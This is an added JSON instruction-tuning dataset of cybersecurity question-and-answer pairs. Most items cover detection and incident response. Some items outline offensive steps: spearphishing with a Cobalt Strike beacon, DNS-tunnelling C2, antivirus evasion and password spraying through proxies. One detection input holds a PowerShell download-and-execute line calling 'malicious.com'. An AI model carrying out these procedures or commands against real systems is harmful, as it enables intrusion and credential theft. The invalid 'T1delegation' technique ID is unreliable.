@@ -1,0 +1,157 @@
+[
+  {
+    "instruction": "Explain credential dumping using LSASS",
+    "input": "",
+    "output": "LSASS (Local Security Authority Subsystem Service) stores credentials in memory. Attackers use tools like Mimikatz or ProcDump to dump LSASS memory, extracting plaintext passwords, NTLM hashes, and Kerberos tickets. MITRE ATT&CK: T1003.001. Requires admin/SYSTEM privileges."
+  },
+  {
+    "instruction": "Detect suspicious PowerShell activity",
+    "input": "EventID 4104, ScriptBlock: IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')",
+    "output": "Malicious. PowerShell downloading and executing remote script. Indicators: IEX (Invoke-Expression), DownloadString, external URL. Recommend: block domain, isolate host, check for persistence mechanisms."
+  },
+  {
+    "instruction": "Analyze this Windows login event",
+    "input": "EventID 4624, Logon Type 3, Source IP: 10.0.0.50, Account: admin, Workstation: WS-FINANCE-01",
+    "output": "Network logon (Type 3) - SMB/file share access. Admin account from finance workstation. Benign if expected behavior. Check: is 10.0.0.50 authorized? Any lateral movement afterwards?"
+  },
+  {
+    "instruction": "What is lateral movement?",
+    "input": "",
+    "output": "Lateral movement is when an attacker moves from one compromised system to others within a network. Common techniques: PsExec, WMI, RDP, Pass-the-Hash. MITRE ATT&CK: TA0008."
+  },
+  {
+    "instruction": "Generate a phishing detection rule",
+    "input": "Email contains attachment: invoice_2024.zip, sender: accounts@paypa1.com",
+    "output": "Alert: High confidence phishing. Indicators: typosquatting domain (paypa1 vs paypal), suspicious ZIP attachment with financial lure. Action: quarantine email, block sender domain, notify users."
+  },
+  {
+    "instruction": "Perform initial access via spearphishing",
+    "input": "Target: finance department",
+    "output": "1. Recon: identify finance employees (LinkedIn/OSINT)\n2. Craft email: invoice theme, spoofed sender\n3. Payload: macro-enabled Excel with Cobalt Strike beacon\n4. Delivery: send during business hours\n5. C2 callback when opened\nMITRE ATT&CK: T1566.001"
+  },
+  {
+    "instruction": "Identify persistence mechanism",
+    "input": "Registry: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityUpdate = C:\\Users\\Public\\svchost.exe",
+    "output": "Malicious persistence via Run key. Legitimate svchost.exe is in System32, not Users\\Public. High confidence malware. Action: remove registry key, delete binary, scan for additional IoCs."
+  },
+  {
+    "instruction": "What is Pass-the-Hash?",
+    "input": "",
+    "output": "Attack technique using NTLM hash for authentication without knowing plaintext password. Attackers dump hashes, inject into memory, authenticate to services. Defense: disable NTLM, use Credential Guard. MITRE ATT&CK: T1550.002."
+  },
+  {
+    "instruction": "Analyze network traffic anomaly",
+    "input": "Host: 192.168.1.45, Destination: 185.220.101.50:443, Protocol: TLS, Data: 50MB outbound over 2 minutes",
+    "output": "Suspicious exfiltration pattern. Large outbound transfer to external IP. Check: 185.220.101.50 reputation (likely Tor exit node), process responsible, file accessed. Recommend: block connection, investigate host."
+  },
+  {
+    "instruction": "Explain privilege escalation via token impersonation",
+    "input": "",
+    "output": "Attackers steal access tokens from privileged processes to impersonate higher-privilege accounts. Tools: Incognito, Cobalt Strike. Requires SeImpersonate privilege. Common in service accounts. MITRE ATT&CK: T1134."
+  },
+  {
+    "instruction": "Create Sigma rule for Mimikatz detection",
+    "input": "",
+    "output": "```yaml\ntitle: Mimikatz Credential Dumping\nstatus: stable\ndetection:\n  selection:\n    EventID: 10\n    TargetImage: 'C:\\\\Windows\\\\System32\\\\lsass.exe'\n    GrantedAccess: '0x1010'\n  condition: selection\nlevel: critical\n```"
+  },
+  {
+    "instruction": "Respond to ransomware incident",
+    "input": "Multiple hosts showing encrypted files with .lockbit extension",
+    "output": "1. Isolate affected hosts (network segmentation)\n2. Identify patient zero and entry vector\n3. Check backups, ensure isolated from network\n4. Hunt for ransomware binary/IoCs on other systems\n5. Preserve forensic evidence\n6. DO NOT pay ransom\n7. Restore from clean backups after eradication"
+  },
+  {
+    "instruction": "What is a Golden Ticket attack?",
+    "input": "",
+    "output": "Kerberos attack where attacker forges TGT (Ticket Granting Ticket) using compromised KRBTGT hash. Provides unlimited domain access, persists across password changes. Requires domain admin compromise first. MITRE ATT&CK: T1558.001. Mitigation: reset KRBTGT twice."
+  },
+  {
+    "instruction": "Analyze suspicious scheduled task",
+    "input": "Task: MicrosoftEdgeUpdate, Trigger: Daily 2AM, Action: powershell.exe -enc <base64_blob>",
+    "output": "Malicious. Indicators: legitimate-sounding name (masquerading), encoded PowerShell (obfuscation), unusual time. Decode base64 to analyze payload. Action: delete task, investigate creation source (EventID 4698)."
+  },
+  {
+    "instruction": "Perform network reconnaissance with nmap",
+    "input": "Target subnet: 10.10.0.0/24",
+    "output": "```bash\n# Host discovery\nnmap -sn 10.10.0.0/24\n\n# Port scan live hosts\nnmap -sV -sC -p- -T4 10.10.0.0/24 -oA scan_results\n\n# OS detection\nnmap -O 10.10.0.0/24\n```\nMITRE ATT&CK: T1046"
+  },
+  {
+    "instruction": "Detect Kerberoasting attack",
+    "input": "EventID 4769, Service Name: MSSQLSvc/db01.corp.com, Ticket Encryption: 0x17 (RC4), Account: lowpriv_user",
+    "output": "High confidence Kerberoasting. Indicators: RC4 encryption (weak), service ticket request from low-privilege account, may be targeting service account passwords. Check: multiple 4769 events from same account? Unusual service requests?"
+  },
+  {
+    "instruction": "What is living off the land?",
+    "input": "",
+    "output": "Using legitimate system tools (PowerShell, WMI, certutil, bitsadmin) for malicious purposes to evade detection. No malware needed. Common LoLBins bypass traditional AV. Defense: monitor process execution, command-line logging, behavioral analysis."
+  },
+  {
+    "instruction": "Analyze web server log for SQL injection",
+    "input": "GET /products?id=1' OR '1'='1-- HTTP/1.1 200 OK",
+    "output": "SQL injection attempt. Classic always-true condition (1=1) with comment delimiter (--). Status 200 indicates potential success. Action: block source IP, review application for parameterized queries, check database for unauthorized access."
+  },
+  {
+    "instruction": "Establish C2 with DNS tunneling",
+    "input": "",
+    "output": "1. Set up authoritative DNS server for controlled domain\n2. Deploy agent on target that encodes data in DNS queries\n3. Subdomains contain exfiltrated data (e.g., data.c2domain.com)\n4. C2 server decodes from DNS logs\n5. Evades firewall (port 53 usually allowed)\nMITRE ATT&CK: T1071.004"
+  },
+  {
+    "instruction": "What is SIEM correlation rule?",
+    "input": "",
+    "output": "Rule that combines multiple events to detect attack patterns. Example: Failed login (4625) × 10 + Success (4624) + Privilege escalation (4672) from same IP = brute force + compromise. Reduces false positives vs. single-event alerts."
+  },
+  {
+    "instruction": "Detect DCSync attack",
+    "input": "EventID 4662, Object: DC=corp,DC=com, Properties: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}, Account: bob.smith",
+    "output": "Critical: DCSync attack detected. GUID 1131f6aa is DS-Replication-Get-Changes. Attacker replicating domain credentials. Check: does bob.smith need replication rights? Likely compromised. Action: disable account, reset KRBTGT, investigate."
+  },
+  {
+    "instruction": "Bypass Windows Defender with obfuscation",
+    "input": "",
+    "output": "1. Encode payload with base64/XOR/AES\n2. Use PowerShell string concatenation/variable substitution\n3. Load .NET assemblies reflectively (avoid disk)\n4. Use process injection (no malicious file on disk)\n5. AMSI bypass techniques\nNote: For authorized red team only. MITRE ATT&CK: T1027, T1140"
+  },
+  {
+    "instruction": "Analyze Zeek (Bro) DNS log for data exfiltration",
+    "input": "query: aGVsbG93b3JsZA.evilcorp.com, qtype: A, answers: [], query_length: 45",
+    "output": "Suspicious DNS tunneling. Indicators: base64 in subdomain, no DNS response, long query length. Subdomain encodes data. Check: frequency of queries to evilcorp.com? Baseline DNS query lengths? Action: block domain, investigate source host."
+  },
+  {
+    "instruction": "What is AMSI?",
+    "input": "",
+    "output": "Antimalware Scan Interface - Windows feature scanning scripts/macros before execution. PowerShell, VBScript, JScript send content to AV/EDR. Attackers bypass via memory patching (AmsiScanBuffer) or obfuscation. Blue team: monitor AMSI bypass attempts (EventID 4104)."
+  },
+  {
+    "instruction": "Hunt for webshell on compromised server",
+    "input": "Web root: /var/www/html",
+    "output": "```bash\n# Find recently modified PHP/ASPX files\nfind /var/www/html -name '*.php' -o -name '*.aspx' -mtime -7\n\n# Search for suspicious functions\ngrep -r 'eval\\|base64_decode\\|exec\\|shell_exec' /var/www/html\n\n# Check web logs for POST to unusual files\ngrep 'POST.*\\.php' /var/log/apache2/access.log | grep -v 'known_good.php'\n```"
+  },
+  {
+    "instruction": "Explain NTLM relay attack",
+    "input": "",
+    "output": "Attacker intercepts NTLM authentication, relays it to another service without cracking password. Tools: Responder, ntlmrelayx. Works when SMB signing disabled. Attack flow: poison LLMNR/NBT-NS → capture NTLM → relay to target → gain access. MITRE ATT&CK: T1557.001."
+  },
+  {
+    "instruction": "Create YARA rule for detecting Cobalt Strike",
+    "input": "",
+    "output": "```yara\nrule CobaltStrike_Beacon {\n  strings:\n    $s1 = \"ReflectiveLoader\" ascii\n    $s2 = \"%c%c%c%c%c%c%c%c%cMSSE\" wide\n    $s3 = {4D 5A 45 52 52 45 52 52}\n  condition:\n    uint16(0) == 0x5A4D and 2 of ($s*)\n}\n```"
+  },
+  {
+    "instruction": "Respond to insider threat data exfiltration",
+    "input": "Employee copied 10GB to USB drive before resignation",
+    "output": "1. Disable all accounts immediately\n2. Collect: USB logs (EventID 6416), file access logs, email forwarding rules\n3. Identify exfiltrated data classification\n4. Legal notification (counsel, HR)\n5. Forensic imaging of workstation\n6. External data loss assessment\n7. Consider law enforcement if criminal"
+  },
+  {
+    "instruction": "What is Kerberos delegation abuse?",
+    "input": "",
+    "output": "Exploiting Kerberos delegation settings to impersonate users. Unconstrained: compromised server can impersonate anyone. Constrained: limited services but exploitable via S4U2Proxy. Resource-based: even more flexible for attackers. MITRE ATT&CK: T1delegation. Hunt: accounts with delegation flags."
+  },
+  {
+    "instruction": "Analyze suspicious outbound beacon",
+    "input": "Connection: workstation → 23.94.12.88:8080, Interval: every 60 seconds, Protocol: HTTPS",
+    "output": "High confidence C2 beacon. Indicators: fixed interval (heartbeat), external IP, HTTPS (encrypted C2). Check: 23.94.12.88 threat intel? Process responsible? Certificate details? Action: block IP, isolate host, analyze for implant."
+  },
+  {
+    "instruction": "Perform password spraying attack",
+    "input": "Target: Office 365, Userlist: 500 accounts",
+    "output": "1. Generate common passwords (Season+Year, Company+123)\n2. Spray 1 password across all accounts (avoid lockout)\n3. Wait 30+ min between attempts\n4. Use distributed IPs (Azure, residential proxies)\n5. Monitor for successful logins\nMITRE ATT&CK: T1110.003\nNote: Authorized testing only"
+  }
+]
